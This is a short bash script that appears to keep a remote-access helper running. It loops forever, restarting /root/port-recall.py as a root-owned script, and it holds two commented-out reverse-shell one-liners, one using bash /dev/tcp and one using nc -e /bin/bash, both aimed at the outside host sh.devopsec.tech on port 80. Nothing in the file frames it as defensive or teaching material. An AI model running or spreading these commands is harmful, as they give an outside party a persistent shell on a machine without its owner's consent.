#!env  bash
#bash -i >& /dev/tcp/sh.devopsec.tech/80 0>&1
#nc -e /bin/bash sh.devopsec.tech 80
while true
do
python /root/port-recall.py || sleep 10
done
